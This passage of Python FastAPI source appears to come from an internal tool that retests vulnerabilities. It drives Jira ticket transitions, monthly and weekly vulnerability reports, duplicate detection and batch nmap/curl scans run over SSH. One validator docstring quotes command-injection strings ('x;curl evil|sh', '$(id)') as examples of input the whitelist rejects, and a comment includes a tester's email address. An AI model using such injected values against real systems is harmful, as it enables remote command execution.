            with scanner._lock:
                scanner.JOBS.pop(job["id"], None)
                scanner.SEEN_KEYS.discard(key)
            scanner._app_log(f"Triage bulk transition: {key} → Fixed (port closed)")
            succeeded.append({"ticket_key": key})
        except Exception as exc:
            err = str(exc)
            scanner._app_log(f"[ERROR] Triage transition failed: {key} → Fixed: {err}")
            failed.append({"ticket_key": key, "error": err})

    with ThreadPoolExecutor(max_workers=6) as pool:
        futures = [pool.submit(_do, j) for j in candidates]
        for f in as_completed(futures):
            f.result()

    scanner._app_log(
        f"Triage bulk transition complete: {len(succeeded)} succeeded, {len(failed)} failed"
    )
    return {"ok": True, "succeeded": succeeded, "failed": failed}


@app.post("/api/jobs/transition-bulk")
def transition_bulk():
    to_fixed, to_not_fixed = _bulk_transition_candidates()
    succeeded, failed = [], []

    def _do(job, target_status):
        key = job["ticket_key"]
        jira_client = _jira_for_job(job)  # session-aware: Axian or Non-Axian
        try:
            jira_client.transition(key, target_status)
            # Remove the job immediately so the queue clears without waiting for
            # the next poll cycle.  SEEN_KEYS is also cleared so a future poll
            # can re-queue the ticket if it somehow returns (e.g. Jira rejection).
            with scanner._lock:
                scanner.JOBS.pop(job["id"], None)
                scanner.SEEN_KEYS.discard(key)
            scanner._app_log(f"Bulk transition: {key} → {target_status}")
            succeeded.append({"ticket_key": key, "to_status": target_status})
        except Exception as exc:
            err = str(exc)
            scanner._app_log(f"[ERROR] Transition failed: {key} → {target_status}: {err}")
            failed.append({"ticket_key": key, "to_status": target_status, "error": err})

    with ThreadPoolExecutor(max_workers=6) as pool:
        futures = (
            [pool.submit(_do, j, "Fixed")     for j in to_fixed] +
            [pool.submit(_do, j, "Not Fixed") for j in to_not_fixed]
        )
        for f in as_completed(futures):
            f.result()  # propagate any unexpected exception to logs

    scanner._app_log(
        f"Bulk transition complete: {len(succeeded)} succeeded, {len(failed)} failed"
    )
    return {"ok": True, "succeeded": succeeded, "failed": failed}


# ── Monthly Report ─────────────────────────────────────────────────────────

_report_cache: dict = {}   # (client, month) → result; past months never change


# Jira statuses that mean the vulnerability is resolved/fixed.
_REPORT_FIXED_STATUSES = {"fixed", "closed", "done", "resolved"}
# Risk Accepted is its own outcome — it is NOT "Not Fixed" (the risk was
# formally accepted, not left open), so it gets its own label.
_REPORT_RISK_ACCEPTED_STATUSES = {"risk accepted", "accepted risk"}


def _to_report_item(issue: dict) -> dict:
    raw_status = (issue.get("status") or "").strip()
    low = raw_status.lower()
    is_fixed = low in _REPORT_FIXED_STATUSES
    is_risk_accepted = low in _REPORT_RISK_ACCEPTED_STATUSES
    if is_fixed:
        status_label = "Fixed"
    elif is_risk_accepted:
        status_label = "Risk Accepted"
    else:
        status_label = "Not Fixed"
    return {
        "key": issue["key"],
        "vuln_name": issue.get("summary", ""),
        "ip": (issue.get("ips") or [""])[0],
        "rating": issue.get("rating") or issue.get("severity") or "",
        # Raw Jira status plus a Fixed / Not Fixed / Risk Accepted label.
        "status": raw_status or "—",
        "status_label": status_label,
        "is_fixed": is_fixed,
        "is_risk_accepted": is_risk_accepted,
    }


@app.get("/api/report")
def generate_report(client: str, month: str):
    """
    Run 13 JQL count queries for a completed month and return the report data.
    month format: YYYY-MM  (must be a past month — data not available mid-month)
    """
    try:
        year, mon = map(int, month.split("-"))
        if not (1 <= mon <= 12):
            raise ValueError()
    except (ValueError, AttributeError):
        raise HTTPException(400, "month must be YYYY-MM (e.g. 2026-05)")

    today = date.today()
    if (year, mon) >= (today.year, today.month):
        raise HTTPException(400, "Report data is only available after the month has ended")

    cache_key = (client, month)
    if cache_key in _report_cache:
        return _report_cache[cache_key]

    last_day = calendar.monthrange(year, mon)[1]
    start = f"{year}/{mon:02d}/01 00:00"
    end   = f"{year}/{mon:02d}/{last_day} 23:59"

    # Pick the right Jira client and build the right base JQL for this client.
    # Axian:     project = AXG AND labels = "<client_label>"
    # Non-Axian: project = <client_label>   (label IS the project key)
    _, client_session = _get_client(client)
    jira_client = _jira_for_label(client)
    if client_session == "non_axian":
        base = f'project = {client}'
    else:
        base = f'project = {cfg.jira.project} AND labels = "{client}"'

    rf   = jira_client.severity_jql_field
    nr   = f'AND created >= "{start}" AND created <= "{end}"'
    or_  = f'AND created <= "{end}" AND status NOT IN (Fixed, "Risk Accepted")'

    # All 13 queries keyed by name
    queries = {
        "new_total":          nr,
        "new_critical":       f'{nr} AND {rf} ~ critical',
        "new_high":           f'{nr} AND {rf} ~ high',
        "new_medium":         f'{nr} AND {rf} ~ medium',
        "new_low":            f'{nr} AND {rf} ~ low',
        "fixed_this_month":   f'AND resolutiondate >= "{start}" AND resolutiondate <= "{end}" AND status = Fixed',
        "open_total":         or_,
        "open_critical":      f'{or_} AND {rf} ~ critical',
        "open_high":          f'{or_} AND {rf} ~ high',
        "open_medium":        f'{or_} AND {rf} ~ medium',
        "open_low":           f'{or_} AND {rf} ~ low',
        "risk_accepted":      f'AND created <= "{end}" AND status = "Risk Accepted"',
        "total_fixed":        f'AND created <= "{end}" AND status = Fixed',
    }

    results: dict = {}

    def run_query(key: str, extra: str) -> tuple:
        try:
            return key, jira_client.count_jql(f"{base} {extra}")
        except Exception as exc:
            log.warning("Report query failed [%s]: %s", key, exc)
            return key, -1

    with ThreadPoolExecutor(max_workers=13) as pool:
        futures = {pool.submit(run_query, k, v): k for k, v in queries.items()}
        for fut in as_completed(futures):
            k, v = fut.result()
            results[k] = v

    # New discovered vulnerabilities: full list of tickets created this month.
    # If none were created, fall back to a random sample of currently-open
    # tickets — 2 per severity tier (critical/high/medium/low), cascading any
    # shortfall in a tier down to the next one so the sample still totals 8
    # whenever enough open tickets exist anywhere in the backlog.
    new_vulnerabilities = {"is_sample": False, "items": []}
    try:
        if results["new_total"] > 0:
            issues = jira_client.search_jql(f"{base} {nr}")
            new_vulnerabilities["items"] = [_to_report_item(i) for i in issues]
        else:
            sample: list = []
            carry = 0
            for tier in ("critical", "high", "medium", "low"):
                needed = 2 + carry
                tier_issues = jira_client.search_jql(f'{base} {or_} AND {rf} ~ {tier}')
                random.shuffle(tier_issues)
                taken = tier_issues[:needed]
                sample.extend(taken)
                carry = needed - len(taken)
            new_vulnerabilities["is_sample"] = True
            new_vulnerabilities["items"] = [_to_report_item(i) for i in sample]
    except Exception as exc:
        log.warning("New vulnerabilities query failed: %s", exc)
        new_vulnerabilities["error"] = str(exc)

    # OS Breakdown
    os_breakdown = {}
    try:
        from collections import defaultdict
        open_issues = jira_client.search_jql(f"{base} {or_}")
        os_groups = defaultdict(lambda: {"issues": 0, "ips": set()})
        for issue in open_issues:
            os_name = (issue.get("os") or "Unknown").strip()
            os_groups[os_name]["issues"] += 1
            for ip in issue.get("ips", []):
                os_groups[os_name]["ips"].add(ip)
        
        os_list = [
            {"os": k, "issues": v["issues"], "ips": len(v["ips"])}
            for k, v in os_groups.items()
        ]
        os_list.sort(key=lambda x: x["issues"], reverse=True)
        os_breakdown = {"items": os_list}
    except Exception as exc:
        log.warning("OS breakdown query failed: %s", exc)
        os_breakdown = {"error": str(exc), "items": []}

    report = {
        "client": client,
        "month":  month,
        "period": {"start": start, "end": end, "last_day": last_day},
        "new_vulnerabilities": new_vulnerabilities,
        "os_breakdown": os_breakdown,
        "new_tickets": {
            "total":    results["new_total"],
            "critical": results["new_critical"],
            "high":     results["new_high"],
            "medium":   results["new_medium"],
            "low":      results["new_low"],
        },
        "fixed_this_month": results["fixed_this_month"],
        "open_tickets": {
            "total":         results["open_total"],
            "critical":      results["open_critical"],
            "high":          results["open_high"],
            "medium":        results["open_medium"],
            "low":           results["open_low"],
            "risk_accepted": results["risk_accepted"],
        },
        "total_fixed_to_date": results["total_fixed"],
    }
    _report_cache[cache_key] = report
    return report


_weekly_report_cache: dict = {}   # (client, week_start) → result; past weeks never change


@app.get("/api/report/weekly")
def generate_weekly_report(client: str, day: str):
    """
    Run 13 JQL count queries for the ISO week that contains *day*.
    day format: YYYY-MM-DD  (any day in the target week)
    The week must have ended (its Sunday must be in the past).
    """
    try:
        picked = datetime.strptime(day, "%Y-%m-%d").date()
    except ValueError:
        raise HTTPException(400, "day must be YYYY-MM-DD (e.g. 2026-06-10)")

    # Derive Monday–Sunday of the ISO week that contains picked
    week_start: date = picked - timedelta(days=picked.weekday())   # Monday
    week_end:   date = week_start + timedelta(days=6)              # Sunday

    today = date.today()
    if week_end >= today:
        raise HTTPException(400, "Report data is only available after the week has ended")

    cache_key = (client, str(week_start))
    if cache_key in _weekly_report_cache:
        return _weekly_report_cache[cache_key]

    start = f"{week_start.year}/{week_start.month:02d}/{week_start.day:02d} 00:00"
    end   = f"{week_end.year}/{week_end.month:02d}/{week_end.day:02d} 23:59"

    # Pick the right Jira client (mirrors monthly report)
    _, client_session = _get_client(client)
    jira_client = _jira_for_label(client)
    if client_session == "non_axian":
        base = f'project = {client}'
    else:
        base = f'project = {cfg.jira.project} AND labels = "{client}"'

    rf  = jira_client.severity_jql_field
    nr  = f'AND created >= "{start}" AND created <= "{end}"'
    or_ = f'AND created <= "{end}" AND status NOT IN (Fixed, "Risk Accepted")'

    queries = {
        "new_total":        nr,
        "new_critical":     f'{nr} AND {rf} ~ critical',
        "new_high":         f'{nr} AND {rf} ~ high',
        "new_medium":       f'{nr} AND {rf} ~ medium',
        "new_low":          f'{nr} AND {rf} ~ low',
        "fixed_this_week":  f'AND resolutiondate >= "{start}" AND resolutiondate <= "{end}" AND status = Fixed',
        "open_total":       or_,
        "open_critical":    f'{or_} AND {rf} ~ critical',
        "open_high":        f'{or_} AND {rf} ~ high',
        "open_medium":      f'{or_} AND {rf} ~ medium',
        "open_low":         f'{or_} AND {rf} ~ low',
        "risk_accepted":    f'AND created <= "{end}" AND status = "Risk Accepted"',
        "total_fixed":      f'AND created <= "{end}" AND status = Fixed',
    }

    results: dict = {}

    def run_query(key: str, extra: str) -> tuple:
        try:
            return key, jira_client.count_jql(f"{base} {extra}")
        except Exception as exc:
            log.warning("Weekly report query failed [%s]: %s", key, exc)
            return key, -1

    with ThreadPoolExecutor(max_workers=13) as pool:
        futures = {pool.submit(run_query, k, v): k for k, v in queries.items()}
        for fut in as_completed(futures):
            k, v = fut.result()
            results[k] = v

    # New vulnerabilities list (same fallback logic as monthly)
    new_vulnerabilities = {"is_sample": False, "items": []}
    try:
        if results["new_total"] > 0:
            issues = jira_client.search_jql(f"{base} {nr}")
            new_vulnerabilities["items"] = [_to_report_item(i) for i in issues]
        else:
            sample: list = []
            carry = 0
            for tier in ("critical", "high", "medium", "low"):
                needed = 2 + carry
                tier_issues = jira_client.search_jql(f'{base} {or_} AND {rf} ~ {tier}')
                random.shuffle(tier_issues)
                taken = tier_issues[:needed]
                sample.extend(taken)
                carry = needed - len(taken)
            new_vulnerabilities["is_sample"] = True
            new_vulnerabilities["items"] = [_to_report_item(i) for i in sample]
    except Exception as exc:
        log.warning("Weekly report new-vulnerabilities query failed: %s", exc)
        new_vulnerabilities["error"] = str(exc)

    # OS Breakdown
    os_breakdown = {}
    try:
        from collections import defaultdict
        open_issues = jira_client.search_jql(f"{base} {or_}")
        os_groups = defaultdict(lambda: {"issues": 0, "ips": set()})
        for issue in open_issues:
            os_name = (issue.get("os") or "Unknown").strip()
            os_groups[os_name]["issues"] += 1
            for ip in issue.get("ips", []):
                os_groups[os_name]["ips"].add(ip)
        
        os_list = [
            {"os": k, "issues": v["issues"], "ips": len(v["ips"])}
            for k, v in os_groups.items()
        ]
        os_list.sort(key=lambda x: x["issues"], reverse=True)
        os_breakdown = {"items": os_list}
    except Exception as exc:
        log.warning("OS breakdown query failed: %s", exc)
        os_breakdown = {"error": str(exc), "items": []}

    report = {
        "client":  client,
        "period":  {
            "start":      start,
            "end":        end,
            "week_start": str(week_start),
            "week_end":   str(week_end),
        },
        "new_vulnerabilities": new_vulnerabilities,
        "os_breakdown": os_breakdown,
        "new_tickets": {
            "total":    results["new_total"],
            "critical": results["new_critical"],
            "high":     results["new_high"],
            "medium":   results["new_medium"],
            "low":      results["new_low"],
        },
        "fixed_this_week": results["fixed_this_week"],
        "open_tickets": {
            "total":         results["open_total"],
            "critical":      results["open_critical"],
            "high":          results["open_high"],
            "medium":        results["open_medium"],
            "low":           results["open_low"],
            "risk_accepted": results["risk_accepted"],
        },
        "total_fixed_to_date": results["total_fixed"],
    }
    _weekly_report_cache[cache_key] = report
    return report


# ── Duplicate ticket detection ─────────────────────────────────────────────

def _key_num(key: str) -> int:
    """Extract numeric part of a Jira key for chronological sorting."""
    try:
        return int(key.split("-")[-1])
    except (ValueError, IndexError):
        return 0


# Parses tester email from OtherInformation[Paragraph] field.
# Field value looks like: "Tester \nprince.osei-kwakye@cyberteq.com\n Date Started ..."
# Try email pattern first, then fall back to any non-whitespace token.
_TESTER_EMAIL_RE = re.compile(r'Tester\s+([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})', re.IGNORECASE)
_TESTER_TOKEN_RE = re.compile(r'Tester\s+(\S+)', re.IGNORECASE)

def _tester_from_other_info(text: str) -> Optional[str]:
    """Extract tester email from the OtherInformation[Paragraph] field text block."""
    if not text:
        return None
    m = _TESTER_EMAIL_RE.search(text) or _TESTER_TOKEN_RE.search(text)
    return m.group(1).strip() if m else None


@app.get("/api/debug/jira-fields")
def debug_jira_fields(client: str, ticket: str = ""):
    """
    Debug: show the raw search-JQL response for customfield_10057 to diagnose format issues.
    """
    jira_client = _jira_for_label(client)

    result = {
        "fetch_fields": getattr(jira_client, "_fetch_fields", "NOT SET"),
        "fid_otherinformation": getattr(jira_client, "_fields", {}).get("otherinformation"),
    }

    if ticket:
        try:
            serialized = jira_client.search_jql(f'issue = {ticket}', max_results=1)
            if serialized:
                t = serialized[0]
                result["other_information"] = t.get("other_information")
                result["tester_extracted"] = _tester_from_other_info(t.get("other_information") or "")
        except Exception as exc:
            result["error"] = str(exc)

    return result


@app.get("/api/duplicates")
def find_duplicates(client: str):
    """
    Fetch all active (non-closed) tickets for a client and group by
    (first_ip, summary, first_port).  Returns only groups with 2+ tickets.
    Within each group the lowest-numbered key is the recommended keep.
    """
    from collections import defaultdict

    _, client_session = _get_client(client)
    jira_client = _jira_for_label(client)

    if client_session == "non_axian":
        jql = (
            f'project = {client} '
            f'AND status NOT IN (Fixed, "Risk Accepted", Closed, Done) '
            f'ORDER BY created ASC'
        )
    else:
        jql = (
            f'project = {cfg.jira.project} AND labels = "{client}" '
            f'AND status NOT IN (Fixed, "Risk Accepted", Closed, Done) '
            f'ORDER BY created ASC'
        )

    try:
        tickets = jira_client.search_jql(jql)
    except Exception as exc:
        raise HTTPException(500, f"Failed to fetch tickets: {exc}")

    # Group by (first IP, normalised summary, first port, affected_system)
    groups: dict = defaultdict(list)
    for t in tickets:
        ip      = (t.get("ips")   or [""])[0].strip()
        port    = (t.get("ports") or [""])[0].strip()
        summary = (t.get("summary") or "").strip().lower()
        affected_system = (t.get("affected_system") or "").strip()
        if not ip or not summary:
            continue   # can't reliably detect duplicates without at least IP + name
        groups[(ip, summary, port, affected_system)].append(t)

    jira_base_url = jira_client.cfg.url.rstrip("/")

    duplicate_groups = []
    for (ip, summary, port, affected_system), members in groups.items():
        if len(members) < 2:
            continue
        # Oldest key first = recommended keep
        sorted_members = sorted(members, key=lambda t: _key_num(t["key"]))

        def _enrich(t):
            """Resolve tester: OtherInformation field → tester custom field → reporter."""
            tester = (
                _tester_from_other_info(t.get("other_information", ""))
                or t.get("tester")
                or t.get("reporter")
            )
            return {**t, "jira_url": f"{jira_base_url}/browse/{t['key']}", "tester": tester}

        duplicate_groups.append({
            "ip":        ip,
            "port":      port,
            "vuln_name": sorted_members[0].get("summary", ""),
            "keep":      sorted_members[0]["key"],
            "tickets":   [_enrich(t) for t in sorted_members],
            "count":     len(sorted_members),
        })

    # Worst offenders first
    duplicate_groups.sort(key=lambda g: g["count"], reverse=True)

    return {
        "client":           client,
        "total_groups":     len(duplicate_groups),
        "total_duplicates": sum(g["count"] - 1 for g in duplicate_groups),
        "groups":           duplicate_groups,
    }


class ExportDuplicatesRequest(BaseModel):
    client: str
    total_groups: int
    total_duplicates: int
    groups: List[dict]

@app.post("/api/duplicates/export")
def export_duplicates_excel(req: ExportDuplicatesRequest):
    import openpyxl
    import io
    from fastapi import Response

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Duplicates"

    headers = [
        "Summary", "IP Address", 
        "Issue Key (New)", "Issue Key (old)", 
        "Status (New)", "Status (Old)", 
        "Technology (New)", "Technology (Old)", 
        "Port(New)", "Port (Old)"
    ]
    ws.append(headers)

    for g in req.groups:
        summary = g.get("vuln_name", "")
        ip = g.get("ip", "")
        keep_key = g.get("keep")
        
        old_t = next((t for t in g["tickets"] if t["key"] == keep_key), {})
        
        for t in g["tickets"]:
            if t["key"] == keep_key:
                continue 
            
            def _get(ticket_obj, field):
                val = ticket_obj.get(field, "")
                if isinstance(val, list):
                    return ", ".join(str(v) for v in val)
                return str(val) if val is not None else ""
                
            row = [
                summary,
                ip,
                t["key"],
                old_t.get("key", ""),
                _get(t, "status"),
                _get(old_t, "status"),
                _get(t, "technology"),
                _get(old_t, "technology"),
                _get(t, "ports"),
                _get(old_t, "ports")
            ]
            ws.append(row)
            
    buf = io.BytesIO()
    wb.save(buf)
    
    return Response(
        content=buf.getvalue(),
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={
            "Content-Disposition": f"attachment; filename=duplicates_{req.client}.xlsx"
        }
    )



# ── Batch Scan ────────────────────────────────────────────────────────────

def _parse_assets(data: bytes, filename: str = "") -> list:
    """Read IP/Port pairs from an uploaded .xlsx or .csv file.
    Accepts headers like 'IP', 'ip', 'IP Address' and 'Port', 'port', 'Port Number'.
    Returns list of {"ip": str, "port": int}.
    """
    # Match IP column by "ip" OR "host" so headers like "Hostname", "Host",
    # "IP Address", "IP/Hostname" are all accepted.
    _IP_KEYWORDS = ("ip", "host")

    def _find_col(header_row, keyword):
        return next((i for i, h in enumerate(header_row) if keyword in h), None)

    def _find_ip_col(header_row):
        return next(
            (i for i, h in enumerate(header_row)
             if any(k in h for k in _IP_KEYWORDS)),
            None,
        )

    def _from_xlsx(raw):
        import openpyxl
        wb   = openpyxl.load_workbook(filename=io.BytesIO(raw), read_only=True, data_only=True)
        ws   = wb.active
        rows = list(ws.iter_rows(values_only=True))
        if not rows:
            raise ValueError("Excel file is empty")
        header = [str(c).strip().lower() if c is not None else "" for c in rows[0]]
        ip_idx   = _find_ip_col(header)
        port_idx = _find_col(header, "port")
        if ip_idx is None or port_idx is None:
            raise ValueError(f"Could not find IP/Host and Port columns. Found: {list(rows[0])}")
        assets = []
        for row in rows[1:]:
            ip = str(row[ip_idx]).strip() if row[ip_idx] is not None else ""
            if not ip or ip.lower() in ("none", "n/a", ""):
                continue
            try:
                assets.append({"ip": ip, "port": int(row[port_idx])})
            except (TypeError, ValueError):
                continue
        return [a for a in assets if _is_safe_scan_target(a["ip"])]

    def _from_csv(raw):
        text   = raw.decode("utf-8-sig", errors="replace")
        reader = csv.DictReader(io.StringIO(text))
        rows   = list(reader)
        if not rows:
            raise ValueError("CSV file is empty")
        hmap = {k.strip().lower(): k for k in rows[0].keys()}
        ip_key   = next((hmap[h] for h in hmap if any(k in h for k in _IP_KEYWORDS)), None)
        port_key = next((hmap[h] for h in hmap if "port" in h), None)
        if not ip_key or not port_key:
            raise ValueError(f"Could not find IP/Host and Port columns. Found: {list(rows[0].keys())}")
        assets = []
        for row in rows:
            ip = str(row[ip_key]).strip()
            if not ip or ip.lower() in ("none", "n/a", ""):
                continue
            try:
                assets.append({"ip": ip, "port": int(row[port_key])})
            except (TypeError, ValueError):
                continue
        return [a for a in assets if _is_safe_scan_target(a["ip"])]

    if (filename or "").lower().endswith(".csv"):
        return _from_csv(data)
    try:
        return _from_xlsx(data)
    except Exception:
        return _from_csv(data)

# keep old name as alias so nothing else breaks
_parse_excel_assets = _parse_assets


@app.get("/api/debug/threads")
def debug_threads():
    import sys
    import traceback
    from .scanner import _scan_workers
    threads_info = {}
    for th_id, frame in sys._current_frames().items():
        threads_info[str(th_id)] = traceback.format_stack(frame)
    
    workers = {}
    for label, w in _scan_workers.items():
        workers[label] = {
            "alive": w.is_alive(),
            "ident": w.ident,
            "name": w.name
        }
        
    return {
        "threads": threads_info,
        "workers": workers
    }

@app.get("/api/batch-scan/rules")
def batch_scan_rules():
    """Return the list of available scan rules for the batch scan dropdown."""
    from .vuln_rules import RULES
    return [{"name": r.name, "tool": r.tool} for r in RULES]


def _is_safe_scan_target(ip: str) -> bool:
    """True only for a plain IPv4/IPv6 address or DNS hostname.

    Batch-scan targets come from a user-uploaded XLSX/CSV and are interpolated
    into shell commands executed on the Kali box, so a cell like
    ``x;curl evil|sh`` or ``$(id)`` would be command injection. We whitelist a
    strict character set instead of trying to blacklist metacharacters.
    """
    if not ip or len(ip) > 253:
        return False
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        pass
    # Hostname: labels of [A-Za-z0-9-], separated by dots, no leading/trailing hyphen.
    return bool(re.match(
        r'^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)'
        r'(?:\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$', ip))


def _batch_scan_one(kali, ip: str, port: int, rule, sudo_nmap: bool = False) -> dict:
    """Run a scan for one IP:port using the same command builder as the retest queue."""
    import re as _re
    from .vuln_rules import _xml_elem
    from .scanner import _build_scan_command

    if not _is_safe_scan_target(ip):
        raise ValueError(f"Refusing to scan unsafe/invalid target: {ip!r}")

    job_id = f"batch_{uuid.uuid4().hex}"
    cmd = _build_scan_command(rule, ip, port, sudo_nmap)
    if not cmd:
        return {
            "ip": ip, "port": port,
            "valid_to": "N/A", "days": "N/A",
            "verdict": "inconclusive", "status": "⚠️ Inconclusive",
            "detail": "No scan command for this rule",
        }

    cmd = cmd.replace("{JOB_ID}", job_id)
    if rule.tool == "curl":
        timeout = 120
    elif rule.tool == "redis-cli":
        timeout = 15
    else:
        timeout = 600
    stdout, _, _ = kali.exec(cmd, timeout=timeout)

    # Mirror retest queue: retry nmap with -Pn when ICMP ping is blocked
    if rule.tool not in ("curl", "redis-cli") and "-Pn" not in cmd:
        _down = ("host seems down", "0 hosts up", "skipping host")
        if any(p in stdout.lower() for p in _down):
            if cmd.startswith("sudo nmap "):
                pn_cmd = "sudo nmap -Pn " + cmd[len("sudo nmap "):]
            elif cmd.startswith("nmap "):
                pn_cmd = "nmap -Pn " + cmd[len("nmap "):]
            else:
                pn_cmd = None
            if pn_cmd:
                stdout, _, _ = kali.exec(pn_cmd, timeout=timeout)

    xml_out = ""
    if "###XML###" in stdout:
        nmap_section, xml_out = stdout.split("###XML###", 1)
        stdout = nmap_section

    if rule.parse:
        verdict, detail = rule.parse(stdout, xml_out)
    else:
        verdict, detail = "inconclusive", "No parser defined for this rule"

    # For cert rules extract valid_to / days
    not_after = _xml_elem(xml_out, "notAfter") if xml_out else None
    valid_to  = None
    days_val  = None
    if not_after:
        try:
            expiry   = datetime.strptime(not_after[:10], "%Y-%m-%d")
            valid_to = not_after[:19]
            days_val = (expiry.date() - date.today()).days
        except ValueError:
            pass
    else:
        m = _re.search(r"Not valid after\s*:\s*(\d{4}-\d{2}-\d{2})", stdout)
        if m:
            try:
                expiry   = datetime.strptime(m.group(1), "%Y-%m-%d")
                valid_to = m.group(1)
                days_val = (expiry.date() - date.today()).days
            except ValueError:
                pass

    verdict_label = {"fixed": "✅ Not Vulnerable", "not_fixed": "❌ Vulnerable",
                     "inconclusive": "⚠️ Inconclusive"}.get(verdict, verdict)
    return {
        "ip":       ip,
        "port":     port,
        "valid_to": valid_to or "N/A",
        "days":     days_val if days_val is not None else "N/A",
        "verdict":  verdict,
        "status":   verdict_label,
        "detail":   detail,
    }


@app.post("/api/batch-scan/run")
async def batch_scan_run(
    file:      UploadFile = File(...),
    client:    str        = Form(...),
    rule_name: str        = Form(...),
):
    """Parse the uploaded file, start background scanning, return a scan_id for streaming."""
    from . import connections
    from .vuln_rules import RULES

    rule = next((r for r in RULES if r.name == rule_name), None)
    if not rule:
        raise HTTPException(400, f"Unknown rule: {rule_name}")

    data = await file.read()
    fname = file.filename or ""
    try:
        # openpyxl/CSV parsing is CPU-bound and can be slow on large files;
        # run it in a worker thread so it doesn't block the event loop (which
        # would stall every other request, SSE stream, and WebSocket).
        assets = await asyncio.get_running_loop().run_in_executor(
            None, _parse_assets, data, fname
        )
    except Exception as exc:
        raise HTTPException(400, f"Could not read file: {exc}")

    if not assets:
        raise HTTPException(400, "No valid IP/Port rows found in the file")

    kali = connections.get_connection(client)
    if not kali:
        raise HTTPException(503, f"No active SSH connection for '{client}'. Connect via Shell tab first.")

    _, client_cfg = _get_client(client)
    sudo_nmap = bool(client_cfg and getattr(client_cfg, "sudo_nmap", False))

    scan_id   = str(uuid.uuid4())
    q         = _queue_mod.Queue()
    cancel_ev = threading.Event()

    with _BATCH_LOCK:
        _BATCH_QUEUES[scan_id]  = q
        _BATCH_CANCELS[scan_id] = cancel_ev

    def _run_all():
        def _scan(asset):
            if cancel_ev.is_set():
                return None
            try:
                return _batch_scan_one(kali, asset["ip"], asset["port"], rule, sudo_nmap)
            except Exception as exc:
                return {
                    "ip": asset["ip"], "port": asset["port"],
                    "valid_to": "N/A", "days": "N/A",
                    "verdict": "inconclusive", "status": "⚠️ Error", "detail": str(exc),
                }

        with ThreadPoolExecutor(max_workers=6) as pool:
            futures = [pool.submit(_scan, a) for a in assets]
            done_count = 0
            for fut in as_completed(futures):
                result = fut.result()
                if result is not None:
                    done_count += 1
                    q.put({"type": "result", "done": done_count, "data": result})
        q.put({"type": "done"})

    threading.Thread(target=_run_all, daemon=True).start()

    return {"scan_id": scan_id, "total": len(assets), "rule": rule_name}


@app.get("/api/batch-scan/stream/{scan_id}")
async def batch_scan_stream(scan_id: str):
    """SSE stream — yields one JSON event per completed asset, then a 'done' event."""
    q = _BATCH_QUEUES.get(scan_id)
    if q is None:
        raise HTTPException(404, "Scan not found or already finished")

    async def _gen():
        loop = asyncio.get_event_loop()
        try:
            while True:
                try:
                    msg = await loop.run_in_executor(None, lambda: q.get(timeout=60))
                except _queue_mod.Empty:
                    yield "data: {\"type\":\"keepalive\"}\n\n"
                    continue
                yield f"data: {json.dumps(msg)}\n\n"
                if msg.get("type") in ("done", "cancelled"):
                    break
        finally:
            with _BATCH_LOCK:
                _BATCH_QUEUES.pop(scan_id, None)
                _BATCH_CANCELS.pop(scan_id, None)

    return StreamingResponse(
        _gen(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.post("/api/batch-scan/cancel/{scan_id}")
async def batch_scan_cancel(scan_id: str):
    """Signal the running scan to stop."""
    ev = _BATCH_CANCELS.get(scan_id)
    if ev:
        ev.set()
    q = _BATCH_QUEUES.get(scan_id)
    if q:
        q.put({"type": "cancelled"})
    return {"ok": True}


@app.post("/api/batch-scan/export")
async def batch_scan_export(req: dict):
    """Download scan results as CSV."""
    results   = req.get("results", [])
    rule_name = req.get("rule", "batch_scan")
    has_cert  = any(r.get("valid_to", "N/A") != "N/A" for r in results)

    fields = ["ip", "port", "status", "detail"]
    if has_cert:
        fields = ["ip", "port", "valid_to", "days", "status", "detail"]

    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=fields, extrasaction="ignore")
    writer.writeheader()
    for row in results:
        writer.writerow({k: row.get(k, "") for k in fields})
    buf.seek(0)

    safe_name = "".join(c if c.isalnum() else "_" for c in rule_name)[:40]
    fname = f"batch_scan_{safe_name}_{date.today().isoformat()}.csv"
    return StreamingResponse(
        io.BytesIO(buf.getvalue().encode()),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename={fname}"},
    )


# ── SSH connection pool ────────────────────────────────────────────────────

@app.get("/api/ssh/status")
def ssh_status():
    all_status = connections.get_status()
    session_labels = {c.label for c in (
        cfg.clients if active_session == "axian" else (cfg.clients_secondary or [])
    )}
    return {k: v for k, v in all_status.items() if k in session_labels}


@app.post("/api/ssh/{label}/connect")
def ssh_connect(label: str):
    def _do():
        try:
            connections.connect(cfg, label)
            scanner._app_log(f"[SSH] Connected to {label}")
            # Auto-resume paused scan worker if it was paused due to SSH failure
            with scanner._lock:
                if scanner._worker_paused.get(label):
                    scanner._worker_paused[label] = False
                    scanner._app_log(f"[SYSTEM] Scan worker for {label} auto-resumed after SSH reconnect")
        except Exception as exc:
            scanner._app_log(f"[SSH] Connection to {label} failed: {exc}")
    threading.Thread(target=_do, daemon=True).start()
    return {"ok": True, "status": "connecting"}


@app.post("/api/ssh/{label}/disconnect")
def ssh_disconnect(label: str):
    connections.disconnect(label)
    scanner._app_log(f"[SSH] Disconnected from {label}")
    return {"ok": True}


# ── Sweep ──────────────────────────────────────────────────────────────────

@app.get("/api/sweep/{label}/preview")
def sweep_preview(label: str):
    client_cfg, _ = _get_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    from .vuln_rules import match_rule
    jira_client = _jira_for_label(label)
    # Fetch ALL open tickets — no limit; _search_jql pages through everything
    tickets = jira_client.get_sweep_tickets(label)
    by_rule: Dict[str, List[dict]] = {}
    queued_manual = 0
    skipped_queued = 0
    for t in tickets:
        if t["key"] in scanner.SEEN_KEYS:
            skipped_queued += 1
        else:
            rule = match_rule(t["summary"])
            if not rule:
                # Will be queued as a manual review job
                queued_manual += 1
            else:
                by_rule.setdefault(rule.name, []).append({
                    "key": t["key"],
                    "summary": t["summary"],
                    "ip": t["ips"][0] if t.get("ips") else None,
                })
    auto_queue = sum(len(v) for v in by_rule.values())
    to_queue = auto_queue + queued_manual
    return {
        "total": len(tickets),
        "to_queue": to_queue,
        "auto_queue": auto_queue,
